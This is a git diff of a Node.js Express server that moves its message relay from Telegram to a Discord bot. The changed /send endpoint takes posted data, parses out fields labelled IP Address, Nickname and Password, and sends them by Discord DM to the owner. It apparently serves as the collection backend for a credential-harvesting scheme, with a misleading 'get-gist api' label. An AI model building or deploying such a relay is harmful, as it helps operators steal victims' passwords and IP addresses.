@@ -1,10 +1,27 @@
 const express = require("express")
 const axios = require("axios")
-const { Telegraf, Telegram } = require('telegraf')
 const app = express()
 require('dotenv').config()
-const bot = new Telegraf(process.env.BOT_TOKEN)
-const tele = new Telegram(process.env.BOT_TOKEN)
+const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js")
+const client = new Client({
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.DirectMessages,
+  ],
+  partials: ['CHANNEL'], // Required to receive DMs
+});
+
+async function sendDM(userId, messageContent) {
+  try {
+    const user = await client.users.fetch(userId);
+    await user.send(messageContent);
+    console.log(`Sent a DM to ${user.tag}.`);
+  } catch (error) {
+    console.error(`Could not send DM to user with ID ${userId}:`, error);
+  }
+}
 
 app.get("/getgist/:id", async (req, res) => {
   try {
@@ -31,7 +48,19 @@ app.post("/send", async (req, res) => {
     data = data.replace(/\[ENTER\]/g, "\n");
     data = data.replace(/\[HASHTAG\]/g, "#");
     data = data.replace(/\[AND\]/g, "&");
-    await tele.sendMessage(process.env.SENDTO_ID, data)
+    data = data.split("\n")
+    data = data.map(el => el.split(">")[1])
+    const embed = new EmbedBuilder()
+      .setColor(0xFFFF00)
+      .setTitle(data[1])
+      .addFields(
+        { name: 'IP Address', value: data[0] },
+        { name: 'Nickname', value: data[2] },
+        { name: 'Password', value: data[3] },
+      )
+      .setTimestamp()
+      .setFooter({ text: "Copyright get-gist api" })
+    await sendDM(process.env.OWNER_ID, { embeds: [embed] })
     res.json({
       status: "oke"
     })
@@ -43,6 +72,10 @@ app.post("/send", async (req, res) => {
   }
 })
 
-bot.launch();
+client.once("ready", () => {
+  console.log("Discord bot is ready")
+})
+
+client.login(process.env.BOT_TOKEN);
 
 app.listen(3000, () => console.log("App Listening to 3000"))
